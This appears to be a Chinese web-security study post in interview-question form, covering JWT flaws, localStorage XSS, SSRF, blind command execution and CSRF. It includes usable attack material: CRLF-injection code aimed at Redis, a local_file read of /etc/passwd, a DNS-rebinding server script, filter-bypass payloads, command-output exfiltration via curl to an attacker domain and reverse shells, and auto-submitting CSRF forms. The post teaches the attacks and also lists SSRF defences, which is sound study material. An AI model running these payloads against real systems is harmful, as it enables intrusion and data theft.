<p>JWT的构成<br>jwt由三部分构成。分别是头部，载荷，签名。中间以点隔开。形如<br>header.payload.signature<br>Header用来声明token的类型和签名用的算法等，需要经过BASE64编码<br>Payload用来表示真正的token信息，也需要经过base64编码<br>Signatur，使用了header和payload的base64编码，根据header指定的加密方式进行加密<br>服务器每次收到信息都会对它的前两部分进行加密，然后比对加密后的结果是否跟客户端传送过来的第三部分相同，如果相同则验证通过，否则失败。</p>
<p>JWT认证流程<br>1、用户使用用户名密码来请求服务器<br>2、服务器进行验证用户的信息<br>3、服务器通过验证发送给用户一个JWTtoke<br>4、客户端存储token，并在每次请求时附送上这个JWTtoken值<br>5、服务端验证token值，并返回数据</p>
<p>JWT常见漏洞</p>
<ol>
<li>敏感信息泄露，由于都是base64编码，可解码</li>
<li>未校验签名。某些服务端并未校验JWT签名是否有效，可以尝试修改signature后或者直接删除signature后尝试攻击</li>
<li>签名算法修改为none，可能绕过签名认证</li>
<li>签名密钥可被破解</li>
</ol>
<h2 id="xss读localstorage"><a href="#xss读localstorage" class="headerlink" title="xss读localstorage"></a>xss读localstorage</h2><p>HTML5提供了两种新的本地存储方案，sessionStorage和localStorage，统称webstorage<br>顾名思义：<br>sessionStorage是针对session的数据存储，关闭窗口后删除<br>localStorage是一个本地的没有时间限制的数据存储。<br>他们同样遵循SOP<br>语法：<br>window.localStorage</p>
<p>localStorage的局限</p>
<ol>
<li>浏览器的大小并不统一，并且在IE8以上的版本才支持localStorage这个属性</li>
<li>目前所有的浏览器中都会把localStorage的值类型限定为string类型，这个对我们日常比较常见的JSON对象类型需要一些转换</li>
<li>localStroage在浏览器的隐私模式下是不可读的</li>
<li>localStorage本质是对字符串的读取，如果存储内容过多，会现好内存空间导致页面变卡</li>
<li>localStorage不能被爬虫抓取到</li>
<li>localStorage的使用也是遵从同源策略的，所以不同的网站直接是不能公用相同的localStorage</li>
</ol>
<p>localStorage的方法<br>setItem 存储数据<br>getItem 读取数据（单个）<br>removeItem 删除某个数据（单个）<br>clear 删除全部数据<br>length localStorage存储的变量的个数<br>key 读取第i个数据名字或称为键值（下标从0开始）<br>valueOf 获取所有存储的数据<br>hasOwnProperty 检查localStorage上是否保存了变量x，需要传入x<br>propertyIsEnumerable 用来检测属性是否属于某个对象的<br>toLocalString 将数组转为本地字符串</p>
<p>localStorage的局限性<br>前端人员为了性能优化利用了本地存储。利用localStorage来进行本地资源缓存，因为其上限大小为5MB，可以装相当多的东西<br>甚至可以在FireFox中修改这个上限。<br>虽然localStorage非常好用，但是也存在安全隐患，如果我们将恶意代码植入里面，那么这段恶意代码也会一直存在<br>直到用户清空localStorage为止</p>
<p>什么是基于localStorage的xss<br>关于一些用户个性化的设置信息可能存储在localStorage中，打开页面的时候JS负责从<br>本地存储中取出数据。但所有的用户输入 都是不可信的，包括本地数据，如果其中存在恶意代码<br>那么会在无形中被攻击，因为地址栏看布基payload，服务器也不知道发生了什么。<br>其实这和普通的xss差不多，但是更加难以防御，因为服务器无法监控</p>
<p>为什么说鸡肋。<br>前面都很美好，但是你没有方法控制写入localStorage<br>一般需要配合其他漏洞，比如xss等来操控js，就可以完成在浏览器的持久化存储</p>
<h2 id="如果请求localhost，127-0-0-1被封禁，如何绕过"><a href="#如果请求localhost，127-0-0-1被封禁，如何绕过" class="headerlink" title="如果请求localhost，127.0.0.1被封禁，如何绕过"></a>如果请求localhost，127.0.0.1被封禁，如何绕过</h2><ol>
<li>利用别名 127.1 ［::］ </li>
<li>利用dns解析，域上设置a记录，指向127.0.0.1</li>
<li>利用变形 @符号，特殊域名等</li>
<li>利用编码，8进制，16进制转换</li>
</ol>
<h2 id="SSRF了解过吗"><a href="#SSRF了解过吗" class="headerlink" title="SSRF了解过吗"></a>SSRF了解过吗</h2><h3 id="什么是SSRF"><a href="#什么是SSRF" class="headerlink" title="什么是SSRF"></a>什么是SSRF</h3><p>SSRF是Server-side Request Forge的缩写，中文翻译为服务端请求伪造。产生的原因是由于服务端提供了从其他服务器应用获取数据的功能且没有对地址和协议等做过滤和限制。<br>常见的一个场景就是，通过用户输入的URL来获取图片。这个功能如果被恶意使用，可以利用存在缺陷的web应用作为代理攻击远程和本地的服务器。这种形式的攻击称为服务端请求伪造攻击。<br>以php为例，常见缺陷代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;  </span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">curl($url);</span><br></pre></td></tr></table></figure>
<h3 id="SSRF的危害"><a href="#SSRF的危害" class="headerlink" title="SSRF的危害"></a>SSRF的危害</h3><p>从上面的示例代码可以看出，请求是从服务器发出的，那么攻击者可以通过构造恶意的url来访问原本访问不到的内网信息，攻击内网或者本地其他服务。这里根据后续处理逻辑不同，还会分为回显型ssrf和非回显型ssrf，所谓的回显型的ssrf就是会将访问到的信息返回给攻击者，而非回显的ssrf则不会，但是可以通过dns log或者访问开放/未开放的端口导致的延时来判断。</p>
<p>SSRF的最大的危害在于穿透了网络边界，但具体能做到哪种程度还需要根据业务环境来判断。例如我们在SSRF的利用中，如果需要更深一步扩展，第一反应通常是去攻击可利用的redis或者memcache等内网服务拿shell，但需要注意的是操作redis，memcache的数据包中是需要换行的，而http/https协议一般无法满足我们要求，所以即使内网存在可利用的redis，也并非所有的ssrf都能利用成功的。但是，对于memcache来说，即使只能使用https协议，利用memcache来getshell却并非不可能，本文会详细介绍一种新型的攻击方式。</p>
<h3 id="SSRF在php中的利用"><a href="#SSRF在php中的利用" class="headerlink" title="SSRF在php中的利用"></a>SSRF在php中的利用</h3><p>在php中，经常出现SSRF的函数有curl和file_get_contents等<br>curl支持http，https，ftp，gopher，telnet，dict和Idap等协议，其中gopher和dict协议就是我们需要的。<br>利用gopher，dict协议，我们可以构造出相应的payload攻击内网的redis服务。<br><strong>需要注意的是</strong></p>
<ol>
<li>file_get_contents的gopher协议不能URLENCODE</li>
<li>file_get_contents关于gopher协议的302跳转有bug，导致利用失败</li>
<li>curl/libcurl 7.43上gopher协议存在bug（阶段），7.45以上无此bug</li>
<li>curl_exe()默认不跟踪跳转</li>
<li>file_get_contents支持php://input协议<h3 id="SSRF在Python中的利用"><a href="#SSRF在Python中的利用" class="headerlink" title="SSRF在Python中的利用"></a>SSRF在Python中的利用</h3>在python中，常用的函数有urllib和requests库。以urllib为例，urllib并不支持gopher，dict协议<br>所以按照常理来说ssrf在python中的危害应该不大。但是当SSRF遇到CRLF，就出了大问题。<br>urllib曾经爆出过CVE-2019-9740,CVE-2019-9947两个漏洞，这两个漏洞都是urllib的CRLF漏洞，只是触发点不一样<br>其影响范围都在urllib2 in Python 2.x through 2.7.16 and urllib in Python 3.x through 3.7.3之间。<br>目前大部分服务器的python2版本都在2.7.10以下，python3都在3.6.x，这两个CRLF漏洞的影响力就非常可观了。<br>python的示例代码如下<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib2 </span><br><span class="line">host = <span class="string">"127.0.0.1:7777?a=1 HTTP/1.1\r\nCRLF-injection: test \r\n TEST: 123"</span></span><br><span class="line">url = <span class="string">"http://"</span> + host + <span class="string">":8080/test/?test=a"</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    info = urllib2.urlopen(url).info()</span><br><span class="line">    print(info)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    print(e)</span><br></pre></td></tr></table></figure>
这样可以成功注入一个header头，利用CLRF漏洞，可以实现换行对redirs进行攻击<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib2 </span><br><span class="line">host = <span class="string">"127.0.0.1:6379?a=1 HTTP/1.1\r\nSET hacker test\r\n"</span></span><br><span class="line">url = <span class="string">"http://"</span> + host + <span class="string">":8080/test/?test=a"</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    info = urllib2.urlopen(url).info()</span><br><span class="line">    print(info)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    print(e)</span><br></pre></td></tr></table></figure>
除去CRLF，urllib还有一个CVE-2019-9948,该漏洞只影响urllib，范围在python2.x到2.7.16，这个版本间的urllib支持local_file/local-file协议<br>可以读取任意文件，如果file协议被禁止后，不妨试试这个协议读取文件<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib2 </span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    info = urllib2.urlopen(<span class="string">"local_file:///etc/passwd"</span>).read()</span><br><span class="line">    print(info)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    print(e)</span><br></pre></td></tr></table></figure>
<h3 id="SSRF在java中的利用"><a href="#SSRF在java中的利用" class="headerlink" title="SSRF在java中的利用"></a>SSRF在java中的利用</h3>相较于php，在java中SSRF的利用局限比较大，一般利用http协议来探测端口，利用file协议读取文件。<br>常见类中如HttpURLConnection，URLConnection，HttpClients中只支持sun.net.<a href="http://www.protocol(java1.8)里的所有协议。" target="_blank" rel="noopener">www.protocol(java1.8)里的所有协议。</a><br>包括http,https,file,ftp,mailto,jar,netdoc<br>但这里需要注意一个漏洞，那就是weblogic的ssrf，这个ssrf是可以用来攻击redis拿shell的。<h3 id="SSRF的攻防"><a href="#SSRF的攻防" class="headerlink" title="SSRF的攻防"></a>SSRF的攻防</h3>SSRF的攻防过程也是人们对SSRF漏洞认知不断提升的一个过程，从开始个大厂商不认可SSRF漏洞-&gt;攻击者利用SSRF拿到服务器权限</li>
</ol>
<p>-&gt;厂商开始重视这个问题-&gt;各种方法防御-&gt;被攻击者绕过-&gt;更新防御手段。在这个过程中，攻击者和防御者的手段呈螺旋式上升的趋势，<br>涌现了大量的绕过方案。<br>常见的修复方案用伪代码表示如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if check_ssrf(url)</span><br><span class="line">    do_curl(url)</span><br><span class="line">else</span><br><span class="line">    print(&apos;error&apos;)</span><br></pre></td></tr></table></figure>
<p>所有的攻防都是针对check_ssrf这个函数的更新和绕过，这里学习一下经典的绕过方案</p>
<h4 id="30x跳转"><a href="#30x跳转" class="headerlink" title="30x跳转"></a>30x跳转</h4><p>30x跳转是SSRF漏洞利用中的一个经典绕过，当防御方法只允许http(s)或者对请求的host做了正确的校验后<br>可以通过30x跳转进行绕过。<br>针对只允许http(s)的情况，我们可以通过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Location:dict://127.0.0.1:6379</span><br></pre></td></tr></table></figure>
<p>跳转到dict协议，从而扩大供给面，进行更深入的利用<br>针对没有禁止url跳转，但是对host做了正确判断的情况，可以通过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Location:http://127.0.0.1:6379</span><br></pre></td></tr></table></figure>
<p>的方式来绕过限制</p>
<h4 id="URL解析绕过"><a href="#URL解析绕过" class="headerlink" title="URL解析绕过"></a>URL解析绕过</h4><p>其实在ssrf利用的过程中也有零星的利用url解析绕过check_ssrf的payload，但大部分利用payload最后之所以成功是因为代码编码使用的正则匹配不当。<br>第一个正式的深入利用是orange在blackhat大会上提出的A-New-Era-Of-SSRF-Exploiting,利用语言本身自带的解析函数差异来绕过检测，在该ppt中举例了<br>的url解析函数对url解析的差异，从而导致check_ssrf和do_curl解析不同导致的绕过</p>
<p>以python3为例。对于同一个url<code>http://baidu.com\@qq.com</code>，urllib和urllib3的解析就不一致<br>对urllib3来说，提取到的host是baidu.com而urllib提取到的host是qq.com。如果在check_ssrf中使用urllib3,而业务代码使用urllib<br>两者的解析差异就会导致绕过的情况。<br>这里的url解析问题涉及到了web安全的底层逻辑，不仅是在ssrf中有利用，危害范围很大。<br>包括但不限于url跳转，oauth认证，同源策略等一系列会涉及到host判断的场景。</p>
<h4 id="DNS-rebinding"><a href="#DNS-rebinding" class="headerlink" title="DNS rebinding"></a>DNS rebinding</h4><p>从SSRF修复方案来看，这里流程中进行了两次DNS解析，第一次在check_ssrf的时候会对URL的host进行DNS解析<br>第二次在do_curl的时候进行解析。这两次DNS解析是有时间差的，我们可以使用这个时间差进行绕过。</p>
<p>时间差对应DNS中的机制是TTL。TTL表示DNS里面域名和IP绑定关系的Cache在DNS上存活的最长时间。<br>即请求了域名与ip的关系后，请求方会缓存这个关系，而缓存失效后就会删除，这时候如果重新访问域名指向的IP的话就会建立匹配关系及cache。</p>
<p>当我们设置TTL为0时，当第一次解析域名后，第二次会重新请求DNS服务器获取新的ip。<br><strong>DNS重绑定的原理</strong>是：利用服务器两次解析同一域名的短暂间隙，更换域名背后的ip达到突破同源策略或绕过waf进行ssrf的目的。<br>这里利用的方法如下：</p>
<ol>
<li>在网站SSRF漏洞处访问精心构造的域名。网站第一次解析域名，获取到的IP地址为A；</li>
<li>经过网站后端服务器的检查，判断此IP为合法IP。</li>
<li>网站获取URL对应资源(在第一次网络请求中，先根据域名服务器获取到ip，再向ip地址请求资源)，第二次解析域名，此时已经过了ttl的时间<br>解析记录缓存IP被删除，第二次解析到域名得到的IP为内网IP B；</li>
<li>攻击者访问到了内网IP。</li>
</ol>
<p>以上步骤时最理想的情况，在不同的语言，不同的服务器中也存在差异</p>
<ol>
<li>java中DNS请求成功的话默认缓存30s(字段为networkaddress.cache.tll,默认情况下没有设置)，失败的话缓存10s。<br>缓存时间在/Library/Java/JavaVirtualMachines/jdk/Contents/Home/jre/lib/security/java.security中配置</li>
<li>在php中则默认没有缓存</li>
<li>Linux默认不会进行DNS缓存，mac和windows会缓存，复现的时候不要在mac和windows上尝试</li>
<li>有些公共DNS服务器，比如114.114.114.114还是会把记录进行缓存，但是8.8.8.8时严格按照DNS协议去管理缓存的，如果设置TTL为0，则不进行缓存</li>
</ol>
<p>在传统的ssrf修复方案中，由于java会存在默认的dns缓存，所以一般认为java不存在DNS rebinding的问题，但是设想这么一个场景，如果刚刚好到了<br>DNS的缓存时间，此时更新DNS缓存，那些已经经过了SSRF CHECK但是又没有正是发起业务请求的reques，是否使用的是最新的DNS解析结果。<br>其实理论上只要在第一次请求后等到30秒之前再请求即可，但为了保证效果，可以在28s左右，开始以一个较短的时间间隔去发送请求，以达到时间竞争的效果。</p>
<p>dns rebingding常见方案除了自建dns服务器之外，还可以通过绑定两个A记录，一个绑定外网ip，一个绑定内网ip。当然这种情况访问顺序是随机的，无法保证成功率。<br>自建dns服务器需要将域名的dns服务指向自己的vps，然后在vps上运行dns_server脚本，dns_server.py的内容如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> twisted.internet <span class="keyword">import</span> reactor, defer</span><br><span class="line"><span class="keyword">from</span> twisted.names <span class="keyword">import</span> client, dns, error, server</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">record=&#123;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DynamicResolver</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_doDynamicResponse</span><span class="params">(self, query)</span>:</span></span><br><span class="line">        name = query.name.name</span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> record <span class="keyword">or</span> record[name]&lt;<span class="number">1</span>:</span><br><span class="line">            <span class="comment"># 随意一个 IP，绕过检查即可</span></span><br><span class="line">            ip=<span class="string">"104.160.43.154"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ip=<span class="string">"127.0.0.1"</span></span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> record:</span><br><span class="line">            record[name]=<span class="number">0</span></span><br><span class="line">        record[name]+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">print</span> name+<span class="string">" ===&gt; "</span>+ip</span><br><span class="line">        answer = dns.RRHeader(</span><br><span class="line">            name=name,</span><br><span class="line">            type=dns.A,</span><br><span class="line">            cls=dns.IN,</span><br><span class="line">            ttl=<span class="number">0</span>,</span><br><span class="line">            payload=dns.Record_A(address=<span class="string">b'%s'</span>%ip,ttl=<span class="number">0</span>)</span><br><span class="line">        )</span><br><span class="line">        answers = [answer]</span><br><span class="line">        authority = []</span><br><span class="line">        additional = []</span><br><span class="line">        <span class="keyword">return</span> answers, authority, additional</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">query</span><span class="params">(self, query, timeout=None)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> defer.succeed(self._doDynamicResponse(query))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    factory = server.DNSServerFactory(</span><br><span class="line">        clients=[DynamicResolver(), client.Resolver(resolv=<span class="string">'/etc/resolv.conf'</span>)]</span><br><span class="line">    )</span><br><span class="line">    protocol = dns.DNSDatagramProtocol(controller=factory)</span><br><span class="line">    reactor.listenUDP(<span class="number">53</span>, protocol)</span><br><span class="line">    reactor.run()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">raise</span> SystemExit(main())</span><br></pre></td></tr></table></figure>
<p>当第一次访问时，解析为外网ip通过ssrf检测，<br>第二次访问时，也即业务访问时，ip会指向127.0.0.1，从而达到了绕过目的。</p>
<p>除此之外，还有一些绕过技巧，例如利用IPv6,<br>有些服务没有考虑IPv6的情况，但是内网又支持IPv6，则可以使用IPv6的本地IP如::1或IPv6的内网域名–x.1.ip6.name来绕过过滤</p>
<h4 id="SSRF新手法，When-TLS-Hacks-You"><a href="#SSRF新手法，When-TLS-Hacks-You" class="headerlink" title="SSRF新手法，When TLS Hacks You"></a>SSRF新手法，When TLS Hacks You</h4><p>如果只支持https协议是否存在深入利用的可能？答案是存在的，2020年的blackhat大会上有一个议题When TLS hacks you，这篇文章利用tls对ssrf进行深入利用。该手法是将ssrf+dns rebinding+tls session完美结合在一起的利用链，能够在不依赖其他漏洞（如CRLF）的情况下，攻击内网中的memcache、SMTP服务。</p>
<p>这里介绍一下相关原理：</p>
<p>当客户端和服务器端初次建立TLS握手时（例如浏览器访问HTTPS网站），需要双方建立一个完整的TLS连接，该过程为了保证数据的传输具有完整性和机密性，需要做很多事情，如密钥协商出会话密钥，数字签名身份验证，消息验证码MAC等。这个过程是非常消耗资源的，而且当下一次客户端访问同一个HTTPS网站时，这个过程需要再重复一次，这无疑会造成大量的资源消耗。</p>
<p>为了提高性能，TLS/SSL提供了会话恢复的方式，允许客户端和服务端在某次关闭连接后，下一次客户端访问时恢复上一次的会话连接。会话恢复有两种，一种是基于session ID恢复，一种是使用Session Ticket的TLS扩展。这里主要介绍一下session ID。</p>
<p>每一个会话都由一个Session ID标识符标识，当建立一个TLS连接时，服务器会生成一个session ID给客户端，服务端保留会话记录，重新连接的客户端可以在clientHello消息期间提供此会话ID，并重新使用此前建立的会话密钥，而不需要再次经历秘钥协商等过程。TLS session id在RFC-5077中有着详细描述，基本所有数据都可以用作会话标志符，包括换行符。</p>
<p>Session ticket和session id作用类似，在客户端和服务端建立了一次完整的握手后，服务端会将本次的会话数据加密，但是session ticket将会话记录保存在客户端，而且与session id 32字节的大小不同，session ticket可提供65k的空间，这就能为我们的payload提供足够的空间。</p>
<p>在讲完这些细节之后，攻击的思路就会很清晰了，session id是服务器提供给客户端的，如果我们构建一个恶意的tls服务器，然后将我们的恶意session id发送给客户端，然后通过dns rebinding，将服务器域名的地址指向内网ip应用，例如memcache，客户端在恢复会话时就会带上恶意的session id去请求内网的memcache，从而攻击了内网应用。</p>
<p>大致流程如下：</p>
<p>1.利用服务器发起一个 HTTPS 请求。<br>2.请求时会发起一个 DNS 解析请求，DNS 服务器回应一个 TTL 为 0 的结果，指向攻击者的服务器。<br>3.攻击者服务器响应请求，并返回一个精心构造过的 SessionID，并延迟几秒后回应一个跳转。<br>4.客户端接收到这个回应之后会进行跳转，这次跳转时由于前面那一次 DNS 解析的结果为 TTL 0，则会再次发起一次解析请求，这次返回的结果则会指向 SSRF 攻击的目标（例如本地的memcache数据库）。<br>5.因为请求和跳转时的域名都没有变更，本次跳转会带着之前服务端返回的精心构造过的 SessionID 进行，发送到目标的那个端口上。<br>6.则达到目的，成功对目标端口发送构造过的数据，成功 SSRF<br>当然，这种攻击存在一定的局限性，除了依赖于发起请求的客户端外（客户端是否实现TLS缓存），由于TLS协议带有各种字符，例如\0x00，可能会导致一些应用解析失败，例如就无法通过该方式来攻击redis。以下是议题作者给出的受影响的HTTPS client列表以及可以攻击的应用 </p>
<h3 id="SSRF的防护"><a href="#SSRF的防护" class="headerlink" title="SSRF的防护"></a>SSRF的防护</h3><p>ssrf的修复比较复杂，需要根据不同的业务场景来指定方案。<br>如果从代码层面来修复的话，一般需要注意下面几个点：</p>
<ol>
<li>去除url中的特殊字符(防止类似python中的解析host差异)</li>
<li>判断是否属于内网ip</li>
<li>如果是域名，将url中的域名改为ip(防止dns rebinding)</li>
<li>请求的url为3中返回的url</li>
<li>请求时设置host header为ip</li>
<li>不跟随30x跳转(跟随跳转需要从1开始重新检测)</li>
</ol>
<p>其中第一步防止利用url parse解析差异。第三步防止dns rebinding，第五步防止ip请求时某些网站无法请求的问题。第六步防止利用30x跳转绕过</p>
<h2 id="命令执行，不回显如何拿结果"><a href="#命令执行，不回显如何拿结果" class="headerlink" title="命令执行，不回显如何拿结果"></a>命令执行，不回显如何拿结果</h2><h3 id="判断命令执行"><a href="#判断命令执行" class="headerlink" title="判断命令执行"></a>判断命令执行</h3><ol>
<li>审计代码，这个肯定容易</li>
<li>利用延时命令判断</li>
<li>http请求。然后在vps监听请求</li>
<li>dnslog判断<h3 id="拿结果"><a href="#拿结果" class="headerlink" title="拿结果"></a>拿结果</h3></li>
<li>通过执行命令，直接将命令执行结果写入到可读的文件类型，比如txt文件</li>
<li>通过执行命令，直接写webshell，通过webshell操作</li>
<li>通过dnslog带出结果 例如 curl <code>command</code>.domain</li>
<li>直接弹一个shell到vps上操作<h2 id="命令执行，不出网如何拿结果"><a href="#命令执行，不出网如何拿结果" class="headerlink" title="命令执行，不出网如何拿结果"></a>命令执行，不出网如何拿结果</h2>这里不出网有回显</li>
<li>直接写shell然后通过shell操作</li>
<li>写结果然后去读<h2 id="如何利用任意文件下载"><a href="#如何利用任意文件下载" class="headerlink" title="如何利用任意文件下载"></a>如何利用任意文件下载</h2></li>
<li>下载服务器文件，比如脚本代码，服务器配置或者系统配置。下载常规的配置文件，例如: ssh,weblogic,ftp,mysql等相关配置<h2 id="如何知道网站的目录，tomcat的路径"><a href="#如何知道网站的目录，tomcat的路径" class="headerlink" title="如何知道网站的目录，tomcat的路径"></a>如何知道网站的目录，tomcat的路径</h2></li>
<li>尝试在网站上找报错点，有时会将绝对路径爆出</li>
<li>找各种配置的文件，比如phpinfo</li>
<li>tomcat的目录结构<br>一级目录<br> bin-Tomcat执行脚本目录<br> conf-Tomcat配置文件<br> lib-Tomcat运行需要的库文件log文件<br> temp-tomcat临时文件存放目录<br> webapps-tomcat的主要web发布目录（存放我们自己的jsp，servlet，类）<br> work-tomcat的工作目录<h2 id="csrf了解过吗"><a href="#csrf了解过吗" class="headerlink" title="csrf了解过吗"></a>csrf了解过吗</h2><h3 id="什么是csrf"><a href="#什么是csrf" class="headerlink" title="什么是csrf"></a>什么是csrf</h3>csrf翻译出来是跨站请求伪造。攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获得的注册凭证，<br>绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的。<br>一个典型的CSRF攻击流程如下：</li>
<li>受害者登录a.com并保留了登录凭证(cookie)</li>
<li>攻击者引诱受害者访问了b.com</li>
<li>b.com向a.com发送了一个请求，浏览器会默认携带a.com的cookie</li>
<li>a.com收到请求后，对请求进行验证，并确认是受害者的凭证，误以为是受害者自己发送的请求。</li>
<li>a.com以受害者的名义执行了操作</li>
<li>攻击完成。攻击者在受害者不知情的情况下冒充了受害者，让a.com完成了攻击者的操作。<h3 id="常见的几种CSRF攻击类型"><a href="#常见的几种CSRF攻击类型" class="headerlink" title="常见的几种CSRF攻击类型"></a>常见的几种CSRF攻击类型</h3><h4 id="GET类型的CSRF"><a href="#GET类型的CSRF" class="headerlink" title="GET类型的CSRF"></a>GET类型的CSRF</h4>GET类型的CSRF利用非常简单，只需要一个HTTP请求。一般是将参数带在了URL中。所以不需要提交表单直接请求url就可以完成攻击</li>
</ol>
<h4 id="POST类型的CSRF"><a href="#POST类型的CSRF" class="headerlink" title="POST类型的CSRF"></a>POST类型的CSRF</h4><p>这种类型的CSRF利用起来通常是一个自动提交的表单，如</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://bank.example/withdraw"</span> <span class="attr">method</span>=<span class="string">POST</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"account"</span> <span class="attr">value</span>=<span class="string">"xiaoming"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"amount"</span> <span class="attr">value</span>=<span class="string">"10000"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"for"</span> <span class="attr">value</span>=<span class="string">"hacker"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"> <span class="built_in">document</span>.forms[<span class="number">0</span>].submit(); </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作。<br>POST类型攻击比GET要严格一些，但也不复杂，任意网站，博客，都有可能被利用来进行攻击</p>
<h4 id="链接类型的CSRF"><a href="#链接类型的CSRF" class="headerlink" title="链接类型的CSRF"></a>链接类型的CSRF</h4><p>这个相对来说并不常见，因为需要用户交互，比如这样</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://test.com/csrf/withdraw.php?amount=1000&amp;for=hacker"</span> <span class="attr">taget</span>=<span class="string">"_blank"</span>&gt;</span></span><br><span class="line">  重磅消息！！</span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p>相对于前两种不需要交互的来说，这个利用难度明显上升了。</p>
<h3 id="CSRF的特点"><a href="#CSRF的特点" class="headerlink" title="CSRF的特点"></a>CSRF的特点</h3><ol>
<li>攻击发起一般在第三方网站，而不是被攻击的网站。</li>
